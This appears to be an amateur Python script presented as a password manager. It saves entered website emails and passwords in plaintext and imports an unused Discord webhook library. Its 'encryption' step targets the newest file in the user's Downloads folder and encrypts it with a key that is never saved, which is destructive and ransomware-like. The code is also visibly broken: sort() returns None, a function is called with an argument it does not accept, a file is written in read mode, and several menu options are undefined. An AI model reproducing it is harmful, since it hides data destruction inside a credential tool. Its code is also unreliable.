from discord_webhook import DiscordWebhook, DiscordEmbed
from cryptography.fernet import Fernet
import colorama
import random
import time
import sys
import os

print("""                                   
                                                    
                                                    WARNING:        
          
                        Do not use this password manager, it is highly exploitable and editable.
                                        Made by: salomao31(my discord)
          
    """)


time.sleep(5)
print("Loading...")
time.sleep(2)
os.system("cls")
username = os.environ.get("USERNAME")

files = os.listdir(r"C:\\users\\salom\\Downloads")

files_sorted = files.sort(key=lambda x: os.path.getctime(os.path.join(r"C:\\users\\salom\\Downloads", x)), reverse=True)

numb_gen = random.randint(0,2000)

def encryption():
    key = Fernet.generate_key()
    f = Fernet(key)
    
    with open(files_sorted, "rb") as f:
        file_content = f.read()

    file_encrypted = f.encrypt(file_content)

    with open(files_sorted, "rb") as f:
        f.write(file_encrypted)


def saving_to_file(email, password):

    with open(f"ANX{numb_gen}", "w") as file:
         file.write(f"{email}\n")
         file.write(f"{password}\n")
     
def Profile_Creation():
    X = input("Website email: ")
    time.sleep(2)
    Y = input("Website Password: ")
    time.sleep(2)
    saving_to_file(X, Y)
    print("Successfully saved!")
    
    # Use the most recent file in the directory
    recent_file = files_sorted[0]
    encryption(recent_file)  # Pass the filename to the encryption function
    print("Successfully encrypted!")

def choice_assist():

    if X1 == 1:
        Profile_Creation()
    elif X1 == 2:
        Profile_Deletion()
    elif X1 == 3:
        Passwords()
    else: 
        print("Uh oh that doesnt seem right, try again i guess? :( ")
        time.sleep(2)
        os.system("cls")
        start()

def start():

    global X1

    while True:

        print(f"""

            Welcome to my password manager {username} :)
          
            [1] - Add Profile
            [2] - Delete Profile
            [3] - See Passwords
            [4] - Help
        
            """)
    
        try:
            X1 = int(input(" "))
            choice_assist()
            break
        except SyntaxError:
            print("You need to enter a numbers not a letter you dummy")
            time.sleep(2)
            os.system("cls")
            continue

start()
os.system("cls")


